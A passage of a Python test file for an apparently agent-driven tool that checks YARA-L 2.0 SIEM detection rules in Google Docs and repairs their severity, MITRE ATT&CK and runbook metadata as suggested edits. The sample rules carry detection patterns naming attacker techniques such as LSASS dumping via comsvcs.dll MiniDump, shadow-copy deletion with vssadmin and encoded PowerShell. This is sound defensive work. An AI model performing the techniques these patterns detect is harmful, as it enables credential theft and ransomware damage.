        'mitre_attack_tactic = "Persistence / Privilege Escalation"'
        in compiled_rules[0]
    )
    assert (
        'mitre_attack_url = "https://attack.mitre.org/techniques/T1543/003/"'
        in compiled_rules[0]
    )


def test_verify_and_redline_yaral2_rules_in_doc_meta_mitre_redlining_idempotency_and_adk_schema():
    """Verifies end-to-end Google Docs commenting, descending-index ``writeMode="SUGGEST"``
    edits, Pass 2 suggestion idempotency (``skipped_existing_suggestion_count``), and
    ADK ``FunctionTool`` schema declaration for ``verify_meta_mitre`` and
    ``synthesize_missing_meta``."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        verify_and_redline_yaral2_rules_in_doc,
    )
    from manager.tools.tools import (
        verify_and_redline_yaral2_rules_in_doc as adk_verify_yaral2_tool,
    )

    fn_tool = FunctionTool(adk_verify_yaral2_tool)
    decl = fn_tool._get_declaration()
    schema_str = str(decl.parameters_json_schema or decl.parameters)
    assert "verify_meta_mitre" in schema_str
    assert "synthesize_missing_meta" in schema_str

    doc_text = (
        'rule gcp_sa_privilege_escalation_missing_meta_case_33278 {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    severity = "HIGH"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_powershell_inconsistent_meta_case_33269 {\n'
        '  meta:\n'
        '    author = "Chronicle SOC"\n'
        '    mitre_attack_technique = "T1059.003"\n'
        '    mitre_attack_tactic = "Initial Access"\n'
        '    mitre_attack_url = "https://attack.mitre.org/techniques/T1059.003/"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-h12-e2e", "Cycle 12 H12 E2E", doc_text
    )
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h12-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-h12-e2e",
        run_live_siem_check=True,
        verify_meta_mitre=True,
        synthesize_missing_meta=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=lambda q, s, e, m: {"events": [{"udm": {}}], "total_events": 1},
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["yaral2_findings_count"] == 4
    assert res["comments"]["inserted_count"] == 4
    assert res["edits"]["applied_count"] == 4
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2: simulate existing pending suggestion spanning the document
    mock_doc_pass2 = {
        "documentId": "doc-h12-e2e",
        "title": "Cycle 12 H12 E2E",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h12.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h12-e2e",
        run_live_siem_check=True,
        verify_meta_mitre=True,
        synthesize_missing_meta=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=lambda q, s, e, m: {"events": [{"udm": {}}], "total_events": 1},
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pass2)),
    )
    assert res2["yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 4
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0


def test_infer_yaral2_severity_from_risk_score_and_runbook_skill_from_rule():
    """H19 Suite 1: Verifies ``infer_yaral2_severity_from_risk_score`` across all 5
    Chronicle Risk Analytics bands (``90..100`` -> ``"CRITICAL"``, ``70..89`` ->
    ``"HIGH"``, ``40..69`` -> ``"MEDIUM"``, ``20..39`` -> ``"LOW"``, ``1..19`` ->
    ``"INFORMATIONAL"``, including conditional ``max(if(..., 85, 40))`` and
    ``condition: $risk_score >= 90``) and verifies ``infer_yaral2_runbook_skill_from_rule``
    against the live ``SkillRegistry`` across ``compromised-user-account-response``,
    ``suspicious-login-triage``, ``malware-incident-response``, ``ransomware-response``,
    and ``phishing-response``.
    """
    from manager.tools.docs_review_tools import (
        infer_yaral2_runbook_skill_from_rule,
        infer_yaral2_severity_from_risk_score,
    )
    from skills.registry import SkillRegistry

    registry = SkillRegistry()

    # 1. Severity-to-Risk-Score band mapping across all 5 tiers
    band_cases = [
        ("max(95)", "CRITICAL", 95, "90..100"),
        ("max(85)", "HIGH", 85, "70..89"),
        ("max(55)", "MEDIUM", 55, "40..69"),
        ("max(25)", "LOW", 25, "20..39"),
        ("max(10)", "INFORMATIONAL", 10, "1..19"),
        (
            'max(if($e.target.resource.name = "projects/base-production", 85, 40))',
            "HIGH",
            85,
            "70..89",
        ),
    ]
    for rhs_expr, expected_sev, expected_score, expected_band in band_cases:
        rule_txt = (
            "rule score_band_check {\n"
            "  events:\n"
            '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
            "  outcome:\n"
            f"    $risk_score = {rhs_expr}\n"
            "  condition:\n"
            "    $e\n"
            "}\n"
        )
        sev_res = infer_yaral2_severity_from_risk_score(rule_txt)
        assert sev_res is not None
        assert sev_res["canonical_severity"] == expected_sev
        assert sev_res["risk_score"] == expected_score
        assert sev_res["score_band"] == expected_band

    # Condition threshold fallback ($risk_score >= 90 -> CRITICAL)
    cond_thresh_rule = (
        "rule cond_thresh_check {\n"
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        "  outcome:\n"
        "    $risk_score = count_distinct($e.target.resource.name)\n"
        "  condition:\n"
        "    $e and $risk_score >= 90\n"
        "}\n"
    )
    cond_sev = infer_yaral2_severity_from_risk_score(cond_thresh_rule)
    assert cond_sev is not None
    assert cond_sev["canonical_severity"] == "CRITICAL"
    assert cond_sev["risk_score"] == 90
    assert cond_sev["source"] == "condition_threshold"

    # 2. Runbook skill routing inference against live SkillRegistry
    runbook_cases = [
        (
            'rule gcp_iam {\n  events:\n    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n    $e.target.resource.name = "projects/base-production"\n  condition:\n    $e\n}',
            "compromised-user-account-response",
            "T1098.003",
        ),
        (
            'rule lsass_dump {\n  events:\n    re.regex($e.target.process.command_line, `.*comsvcs\\.dll.*MiniDump.*`) nocase\n  condition:\n    $e\n}',
            "compromised-user-account-response",
            "T1003.001",
        ),
        (
            'rule workspace_login {\n  events:\n    $e.metadata.log_type = "WORKSPACE_ACTIVITY"\n    $e.metadata.event_type = "USER_LOGIN"\n  condition:\n    $e\n}',
            "suspicious-login-triage",
            "T1078.004",
        ),
        (
            'rule ps_empire {\n  events:\n    re.regex($e.target.process.command_line, `.*powershell.*-enc.*`) nocase\n  condition:\n    $e\n}',
            "malware-incident-response",
            "T1059.001",
        ),
        (
            'rule cmd_shell {\n  events:\n    re.regex($e.target.process.command_line, `.*cmd\\.exe.*`) nocase\n  condition:\n    $e\n}',
            "malware-incident-response",
            "T1059.003",
        ),
        (
            'rule rundll_proxy {\n  events:\n    re.regex($e.target.process.command_line, `.*rundll32\\.exe.*`) nocase\n  condition:\n    $e\n}',
            "malware-incident-response",
            "T1218.011",
        ),
        (
            'rule derp_service {\n  events:\n    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n  condition:\n    $e\n}',
            "malware-incident-response",
            "T1543.003",
        ),
        (
            'rule shadow_copy_ransomware {\n  events:\n    re.regex($e.target.process.command_line, `.*vssadmin.*delete shadows.*`) nocase\n  condition:\n    $e\n}',
            "ransomware-response",
            "T1486",
        ),
        (
            'rule spearphish_delivery {\n  events:\n    $e.metadata.event_type = "EMAIL_TRANSACTION"\n    $e.network.email.from = "attacker@phish-login.com"\n  condition:\n    $e\n}',
            "phishing-response",
            "T1566",
        ),
    ]
    for r_txt, expected_skill, expected_mitre in runbook_cases:
        rb_res = infer_yaral2_runbook_skill_from_rule(
            r_txt, skill_registry=registry
        )
        assert rb_res is not None
        assert rb_res["canonical_skill"] == expected_skill
        assert rb_res["mitre_technique_id"] == expected_mitre
        assert rb_res["skill_verified"] is True
        assert registry.get_skill(expected_skill) is not None


def test_find_yaral2_meta_runbook_and_severity_spans_all_four_defect_classes():
    """H19 Suite 2: Verifies detection and exact 1-based UTF-16 span calculation
    across all 4 H19 defect classes:
    - ``invalid_meta_severity``: ``"SEV1"`` -> ``"CRITICAL"``, ``"WARN"`` -> ``"MEDIUM"``
    - ``meta_severity_risk_score_mismatch``: ``severity = "LOW"`` with ``$risk_score = max(85)`` -> ``"HIGH"``
    - ``meta_runbook_skill_mismatch``: hallucinated ``"gcp-iam-playbook"`` -> ``"compromised-user-account-response"``
      and wrong-domain ``"suspicious-login-triage"`` on a Windows ``DERPService`` rule -> ``"malware-incident-response"``
    - ``missing_meta_runbook_skill``: missing ``runbook_skill`` -> synthesizes ``runbook_skill = "malware-incident-response"``
      on the ``insertion_anchor``
    with 0 false positives on a valid control rule.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_meta_runbook_and_severity_spans,
    )

    doc_text = (
        'rule r1_sev_mismatch_and_hallucinated_runbook {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '    severity = "LOW"\n'
        '    runbook_skill = "gcp-iam-playbook"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '  outcome:\n'
        '    $risk_score = max(85)\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule r2_non_canonical_sev_and_wrong_domain_runbook {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '    severity = "SEV1"\n'
        '    runbook_skill = "suspicious-login-triage"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n'
        '  outcome:\n'
        '    $risk_score = max(95)\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule r3_warn_sev_and_missing_runbook {\n'
        '  meta:\n'
        '    severity = "WARN"\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule r4_valid_control {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '    severity = "MEDIUM"\n'
        '    runbook_skill = "malware-incident-response"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*cmd\\.exe.*`) nocase\n'
        '  outcome:\n'
        '    $risk_score = max(55)\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_meta_runbook_and_severity_spans(
        doc_text, idx_map
    )

    assert len(findings) == 6
    assert len(comments) == 6
    assert len(edits) == 6
    assert "r4_valid_control" not in {f["rule_name"] for f in findings}

    # Verify every edit span matches doc_text[start-1:end-1] and no two spans overlap
    for i, ed in enumerate(edits):
        s_idx = ed["start_index"]
        e_idx = ed["end_index"]
        assert doc_text[s_idx - 1 : e_idx - 1] == ed["quote"]
        for j in range(i + 1, len(edits)):
            other = edits[j]
            assert e_idx <= other["start_index"] or other["end_index"] <= s_idx

    by_rule_and_type = {(f["rule_name"], f["defect_type"]): f for f in findings}

    f_r1_sev = by_rule_and_type[
        ("r1_sev_mismatch_and_hallucinated_runbook", "meta_severity_risk_score_mismatch")
    ]
    assert f_r1_sev["quote"] == "LOW"
    assert f_r1_sev["replacement"] == "HIGH"
    assert f_r1_sev["risk_score"] == 85
    assert f_r1_sev["score_band"] == "70..89"

    f_r1_rb = by_rule_and_type[
        ("r1_sev_mismatch_and_hallucinated_runbook", "meta_runbook_skill_mismatch")
    ]
    assert f_r1_rb["quote"] == "gcp-iam-playbook"
    assert f_r1_rb["replacement"] == "compromised-user-account-response"
    assert f_r1_rb["skill_verified"] is True

    f_r2_sev = by_rule_and_type[
        ("r2_non_canonical_sev_and_wrong_domain_runbook", "invalid_meta_severity")
    ]
    assert f_r2_sev["quote"] == "SEV1"
    assert f_r2_sev["replacement"] == "CRITICAL"

    f_r2_rb = by_rule_and_type[
        ("r2_non_canonical_sev_and_wrong_domain_runbook", "meta_runbook_skill_mismatch")
    ]
    assert f_r2_rb["quote"] == "suspicious-login-triage"
    assert f_r2_rb["replacement"] == "malware-incident-response"

    f_r3_sev = by_rule_and_type[
        ("r3_warn_sev_and_missing_runbook", "invalid_meta_severity")
    ]
    assert f_r3_sev["quote"] == "WARN"
    assert f_r3_sev["replacement"] == "MEDIUM"

    f_r3_rb = by_rule_and_type[
        ("r3_warn_sev_and_missing_runbook", "missing_meta_runbook_skill")
    ]
    assert f_r3_rb["quote"] == 'author = "SecOps"'
    assert (
        f_r3_rb["replacement"]
        == 'author = "SecOps"\n    runbook_skill = "malware-incident-response"'
    )


def test_find_yaral2_rule_spans_folds_anchor_severity_repair_mitre_and_runbook_synthesis_without_overlap():
    """H19 Suite 3: Verifies that when a rule's ``insertion_anchor`` is ``severity = "LOW"``
    (which itself needs repair to ``"HIGH"``) and both MITRE attribution keys and
    ``runbook_skill`` are missing, ``find_yaral2_rule_spans`` folds the anchor repair +
    MITRE synthesis + ``runbook_skill`` synthesis into a single non-overlapping UTF-16
    edit and produces a valid ``repaired_rule_text``.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        'rule gcp_sa_unified_anchor_folding {\n'
        '  meta:\n'
        '    author = "SecOps Agent"\n'
        '    severity = "LOW"\n'
        '  strings:\n'
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        '  outcome:\n'
        '    $risk_score = max(85)\n'
        '  condition:\n'
        '    $event\n'
        '}\n'
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(
        doc_text,
        idx_map,
        verify_meta_mitre=True,
        synthesize_missing_meta=True,
        verify_meta_severity=True,
        verify_meta_runbook=True,
        synthesize_missing_runbook=True,
    )

    # 4 non-overlapping edits:
    # 1. Unified meta anchor (severity = "LOW" -> severity = "HIGH" + mitre_* + runbook_skill)
    # 2. strings: -> events:
    # 3. $iam.resource.name -> $iam.target.resource.name
    # 4. $event -> $iam
    assert len(edits) == 4
    for i, ed in enumerate(edits):
        s_idx = ed["start_index"]
        e_idx = ed["end_index"]
        assert doc_text[s_idx - 1 : e_idx - 1] == ed["quote"]
        for j in range(i + 1, len(edits)):
            other = edits[j]
            assert e_idx <= other["start_index"] or other["end_index"] <= s_idx

    meta_finding = [
        f for f in findings if "synthesized_keys" in f
    ][0]
    assert meta_finding["quote"] == 'severity = "LOW"'
    assert meta_finding["repaired_anchor_key"] == "severity"
    assert meta_finding["repaired_anchor_value"] == "HIGH"
    assert set(meta_finding["folded_defect_types"]) == {
        "meta_severity_risk_score_mismatch",
        "missing_meta_mitre_attribution",
        "missing_meta_runbook_skill",
    }
    assert meta_finding["synthesized_keys"] == [
        "mitre_attack_technique",
        "mitre_attack_tactic",
        "mitre_attack_url",
        "runbook_skill",
    ]
    repaired_rule = meta_finding["repaired_rule_text"]
    assert 'severity = "HIGH"' in repaired_rule
    assert 'mitre_attack_technique = "T1098.003"' in repaired_rule
    assert 'mitre_attack_tactic = "Persistence / Privilege Escalation"' in repaired_rule
    assert (
        'mitre_attack_url = "https://attack.mitre.org/techniques/T1098/003/"'
        in repaired_rule
    )
    assert 'runbook_skill = "compromised-user-account-response"' in repaired_rule
    assert "events:" in repaired_rule
    assert "$iam.target.resource.name" in repaired_rule


def test_collapsed_single_line_yaral2_meta_runbook_and_severity_spans():
    """H19 Suite 4: Verifies ``find_yaral2_meta_runbook_and_severity_spans`` on
    Google Drive Markdown-imported single-line collapsed YARA-L 2.0 rules.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_meta_runbook_and_severity_spans,
    )

    collapsed_rule = (
        'rule collapsed_empire_meta { meta: author = "SOC" severity = "P1" '
        'events: $e.principal.hostname = "wins-d19" '
        're.regex($e.target.process.command_line, `.*powershell.*-enc.*`) nocase '
        'outcome: $risk_score = max(95) condition: $e }'
    )
    idx_map = _build_utf16_index_map(collapsed_rule)
    comments, edits, findings = find_yaral2_meta_runbook_and_severity_spans(
        collapsed_rule, idx_map
    )

    # Because severity = "P1" is the insertion_anchor in the collapsed meta: block,
    # invalid_meta_severity ("P1" -> "CRITICAL") and missing_meta_runbook_skill
    # fold onto the severity = "P1" anchor span.
    assert len(findings) == 1
    f = findings[0]
    assert f["quote"] == 'severity = "P1"'
    assert (
        f["replacement"]
        == 'severity = "CRITICAL" runbook_skill = "malware-incident-response"'
    )
    assert set(f["folded_defect_types"]) == {
        "invalid_meta_severity",
        "missing_meta_runbook_skill",
    }
    assert (
        collapsed_rule[f["start_index"] - 1 : f["end_index"] - 1]
        == 'severity = "P1"'
    )


def test_verify_and_redline_yaral2_rules_in_doc_with_meta_runbook_and_severity_and_adk_tool_schema():
    """H19 Suite 5: Verifies end-to-end ``verify_and_redline_yaral2_rules_in_doc``
    with ``verify_meta_runbook=True``, ``verify_meta_severity=True``, and
    ``synthesize_missing_runbook=True`` against ``httpx.MockTransport`` (ordering
    invariants, Pass 2 idempotency) and checks the ADK ``FunctionTool`` schema
    declaration.
    """
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        verify_and_redline_yaral2_rules_in_doc,
    )
    from manager.tools.tools import (
        verify_and_redline_yaral2_rules_in_doc as adk_verify_yaral2_tool,
    )

    fn_tool = FunctionTool(adk_verify_yaral2_tool)
    decl = fn_tool._get_declaration()
    schema_str = str(decl.parameters_json_schema or decl.parameters)
    assert "verify_meta_runbook" in schema_str
    assert "verify_meta_severity" in schema_str
    assert "synthesize_missing_runbook" in schema_str

    doc_text = (
        'rule gcp_sa_privilege_escalation_case_33278 {\n'
        '  meta:\n'
        '    author = "SecOps Agent"\n'
        '    severity = "LOW"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '  outcome:\n'
        '    $risk_score = max(85)\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_powershell_empire_case_33269 {\n'
        '  meta:\n'
        '    author = "SecOps Agent"\n'
        '    severity = "SEV1"\n'
        '    runbook_skill = "windows-powershell-playbook"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
        '  outcome:\n'
        '    $risk_score = max(95)\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-h19-e2e", "Cycle 13 H19 E2E", doc_text
    )
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h19-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-h19-e2e",
        run_live_siem_check=True,
        verify_meta_runbook=True,
        verify_meta_severity=True,
        synthesize_missing_runbook=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=lambda q, s, e, m: {"events": [{"udm": {}}], "total_events": 1},
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["yaral2_findings_count"] == 3
    assert res["comments"]["inserted_count"] == 3
    assert res["edits"]["applied_count"] == 3
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency
    mock_doc_pass2 = {
        "documentId": "doc-h19-e2e",
        "title": "Cycle 13 H19 E2E",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h19.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h19-e2e",
        run_live_siem_check=True,
        verify_meta_runbook=True,
        verify_meta_severity=True,
        synthesize_missing_runbook=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=lambda q, s, e, m: {"events": [{"udm": {}}], "total_events": 1},
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pass2)),
    )
    assert res2["yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 3
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0


def test_yaral2_in_tuple_and_reference_list_repair() -> None:
    """H18 Suite 1: Verifies inline ``in (...)`` and ``in [...]`` expansion to parenthesized
    ``or`` disjunctions with UDM field canonicalization, Reference List repairs
    (``$e.ip in suspicious_ips`` -> ``$e.principal.ip in %suspicious_ips``,
    ``$e.target.hostname in regex allowed_host_patterns`` -> ``$e.target.hostname in regex %allowed_host_patterns``,
    ``$e.principal.ip = %Suspicious_IPs`` -> ``$e.principal.ip in %suspicious_ips``,
    ``$e.principal.ip != %corp_cidrs`` -> ``not $e.principal.ip in %corp_cidrs``), and zero
    false positives on valid Reference List predicates.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        'rule h18_in_tuple_and_ref_lists {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.ip in ("104.198.226.161", "34.135.255.85")\n'
        '    not $e.hostname in ["wins-d19", "wins-d20"]\n'
        '    $e.ip in suspicious_ips\n'
        '    $e.target.hostname in regex allowed_host_patterns\n'
        '    $e.principal.ip = %Suspicious_IPs\n'
        '    $e.principal.ip != %corp_cidrs\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule h18_valid_ref_list_control {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.principal.ip in %suspicious_ips\n'
        '    $e.principal.ip in cidr %corp_cidrs\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    assert len(findings) == 6
    assert all(f["rule_name"] == "h18_in_tuple_and_ref_lists" for f in findings)
    assert [(f["defect_type"], f["quote"], f["replacement"]) for f in findings] == [
        (
            "invalid_in_membership_syntax",
            '$e.ip in ("104.198.226.161", "34.135.255.85")',
            '($e.principal.ip = "104.198.226.161" or $e.principal.ip = "34.135.255.85")',
        ),
        (
            "invalid_in_membership_syntax",
            'not $e.hostname in ["wins-d19", "wins-d20"]',
            'not ($e.principal.hostname = "wins-d19" or $e.principal.hostname = "wins-d20")',
        ),
        (
            "invalid_reference_list_syntax",
            "$e.ip in suspicious_ips",
            "$e.principal.ip in %suspicious_ips",
        ),
        (
            "invalid_reference_list_syntax",
            "$e.target.hostname in regex allowed_host_patterns",
            "$e.target.hostname in regex %allowed_host_patterns",
        ),
        (
            "invalid_reference_list_syntax",
            "$e.principal.ip = %Suspicious_IPs",
            "$e.principal.ip in %suspicious_ips",
        ),
        (
            "invalid_reference_list_syntax",
            "$e.principal.ip != %corp_cidrs",
            "not $e.principal.ip in %corp_cidrs",
        ),
    ]
    for f in findings:
        assert doc_text[f["start_index"] - 1 : f["end_index"] - 1] == f["quote"]
    assert findings[0]["reference_lists"] == [
        "%suspicious_ips",
        "%allowed_host_patterns",
        "%corp_cidrs",
    ]

    # Also verify Google Drive single-line collapsed events section
    collapsed_doc = (
        'rule h18_collapsed { meta: author = "SecOps" events: '
        '$e.principal.hostname = "wins-d19" $e.principal.hostname in suspicious_windows_hosts '
        're.regex($e.target.process.command_line, `.*powershell.*`) nocase '
        'condition: $e }'
    )
    _, _, collapsed_findings = find_yaral2_rule_spans(
        collapsed_doc, _build_utf16_index_map(collapsed_doc)
    )
    assert len(collapsed_findings) == 1
    assert collapsed_findings[0]["defect_type"] == "invalid_reference_list_syntax"
    assert (
        collapsed_findings[0]["quote"]
        == "$e.principal.hostname in suspicious_windows_hosts"
    )
    assert (
        collapsed_findings[0]["replacement"]
        == "$e.principal.hostname in %suspicious_windows_hosts"
    )



def test_yaral2_strings_coalesce_concat_and_case_functions_repair() -> None:
    """H18 Suite 2: Verifies ``coalesce(...)``, ``ifnull(...)``, ``nvl(...)``,
    ``concat(...)``, ``lower(...)``, and ``upper(...)`` in ``events:`` and ``outcome:``,
    including inner UDM field canonicalization and automatic ``array_distinct(...)``
    wrapping when ``match:`` is present.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        'rule h18_strings_functions_match {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    lower($e.hostname) = "wins-d19"\n'
        '    $e.principal.ip = $ip\n'
        '  match:\n'
        '    $ip over 15m\n'
        '  outcome:\n'
        '    $actor = coalesce($e.user.userid, $e.ip, "unknown")\n'
        '    $fallback_user = ifnull($e.target.user.userid, "none")\n'
        '    $summary = concat($e.hostname, ":", $e.user.userid)\n'
        '    $upper_host = upper($e.hostname)\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    assert len(findings) == 5
    assert [(f["defect_type"], f["quote"], f["replacement"]) for f in findings] == [
        (
            "invalid_strings_function_syntax",
            "lower($e.hostname)",
            "strings.to_lower($e.principal.hostname)",
        ),
        (
            "invalid_strings_function_syntax",
            'coalesce($e.user.userid, $e.ip, "unknown")',
            'array_distinct(strings.coalesce($e.principal.user.userid, $e.principal.ip, "unknown"))',
        ),
        (
            "invalid_strings_function_syntax",
            'ifnull($e.target.user.userid, "none")',
            'array_distinct(strings.coalesce($e.target.user.userid, "none"))',
        ),
        (
            "invalid_strings_function_syntax",
            'concat($e.hostname, ":", $e.user.userid)',
            'array_distinct(strings.concat($e.principal.hostname, ":", $e.principal.user.userid))',
        ),
        (
            "invalid_strings_function_syntax",
            "upper($e.hostname)",
            "array_distinct(strings.to_upper($e.principal.hostname))",
        ),
    ]
    for f in findings:
        assert doc_text[f["start_index"] - 1 : f["end_index"] - 1] == f["quote"]


def test_yaral2_re_capture_function_repair() -> None:
    """H18 Suite 3: Verifies ``regex_extract(...)``, ``regexp_extract(...)``,
    ``re.extract(...)``, ``extract(...)``, ``rex(...)``, slash-delimited ``/pattern/``
    arguments, patterns without capturing groups ``(...)``, and
    ``array_distinct(re.capture(...))`` wrapping in ``match:`` rules.
    """
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        'rule h18_re_capture_match {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    $e.principal.hostname = $host\n'
        '  match:\n'
        '    $host over 15m\n'
        '  outcome:\n'
        '    $ps_flag = regex_extract($e.process.command_line, /-(?:enc|encodedcommand|nop|e)\\b/)\n'
        '    $domain = regexp_extract($e.command_line, "https?://([^/\\s]+)")\n'
        '    $service = re.capture($e.process.command_line, "DERPService\\.exe")\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    assert len(findings) == 3
    assert [(f["defect_type"], f["quote"], f["replacement"]) for f in findings] == [
        (
            "invalid_re_capture_syntax",
            r"regex_extract($e.process.command_line, /-(?:enc|encodedcommand|nop|e)\b/)",
